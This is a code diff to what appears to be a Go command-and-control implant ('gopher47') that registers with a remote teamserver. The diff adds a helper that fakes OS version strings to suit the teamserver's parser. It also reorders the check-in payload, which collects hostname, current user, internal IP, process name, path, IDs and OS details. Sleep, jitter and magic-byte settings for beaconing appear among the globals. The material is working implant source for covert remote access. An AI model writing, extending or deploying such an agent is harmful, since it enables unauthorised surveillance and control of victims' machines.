@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"os"
 	"os/user"
+
 	//"log" // only for debugging
 	"strconv"
 	"strings"
@@ -18,6 +19,7 @@ import (
 	functions "github.com/An00bRektn/gopher47/pkg/agentfuncs"
 	"github.com/An00bRektn/gopher47/pkg/utils"
 	"github.com/elastic/go-sysinfo"
+	systypes "github.com/elastic/go-sysinfo/types"
 )
 
 // Globals
@@ -29,7 +31,7 @@ var (
 	userAgent = c.UserAgent
 	sleepTime = c.SleepTime
 	jitterRange = c.JitterRange
-	magicBytes = []byte("\x67\x6f\x67\x6f")
+	magicBytes = []byte("\x67\x6f\x67\x6f") // GOGO
 	timeoutThreshold = c.TimeoutThreshold
 	timeoutCounter = -1
 	// agentId set in main() because random seeding
@@ -55,6 +57,25 @@ func genHeader(length int) string {
     return string(header)
 }
 
+// Fixes version output from go-sysinfo to suit the teamserver's parsing as of 1-1-2024
+func fixVersion(osInfo systypes.OSInfo) string{
+	// TODO: This is a band-aid fix, current implementation (as of 1-1-2024)
+	//		 expects a Windows version number and nothing else, faking it for linux for now
+	//		 and cheesing Windows because I need to write my own code to fetch the ProductType
+	
+	fixedVersion := ""
+
+	// empty build should mean we're not on Windows
+	if osInfo.Build == "" {
+		fixedVersion = strings.Split(osInfo.Version, " ")[0] + ".0.0.0"
+	} else {
+		// NOTE: OS Version = MajorVersion.MinorVersion.ProductType.ServicePackMajor.BuildNumber
+		fixedVersion = osInfo.Version + "." + "1" + "." + "0" + "." + osInfo.Build
+	}
+	//println("[ DEBUG ] fixedVersion: " + fixedVersion)
+	return fixedVersion
+}
+
 // Sends the initial check-in to register the agent
 // Forms and sends a POST request to teamserver with all required information
 // Heavily reliant on elastic/go-sysinfo
@@ -68,7 +89,7 @@ func registerAgent(url string, magic []byte, agentId string) string{
 	hostname := hostInfo.Hostname
 	currentuser, _ := user.Current()
 	procPath, _ := os.Executable()
-
+	
 	// TODO: Get Process Elevated and Domain, completely forgot about it
 	registerDict := map[string]string{
 		"AgentID": agentId,
@@ -77,15 +98,15 @@ func registerAgent(url string, magic []byte, agentId string) string{
 		"Domain": "",
 		"InternalIP": utils.FindNotLoopback(hostInfo.IPs),
 		"Process Path": procPath,
+		"Process Name": procInfo.Name,
+		"Process Arch": "x64",
 		"Process ID": strconv.Itoa(procInfo.PID),
 		"Process Parent ID": strconv.Itoa(procInfo.PPID),
-		"Process Arch": "x64",
 		"Process Elevated": "0",
+		"OS Version": fixVersion(*hostInfo.OS),
 		"OS Build": hostInfo.OS.Build,
 		"OS Arch": hostInfo.Architecture,
 		"Sleep": strconv.Itoa(c.SleepTime),
-		"Process Name": procInfo.Name,
-		"OS Version": hostInfo.OS.Name + " " + hostInfo.OS.Version,
 	}
 
 	dat, _ := json.Marshal(registerDict)
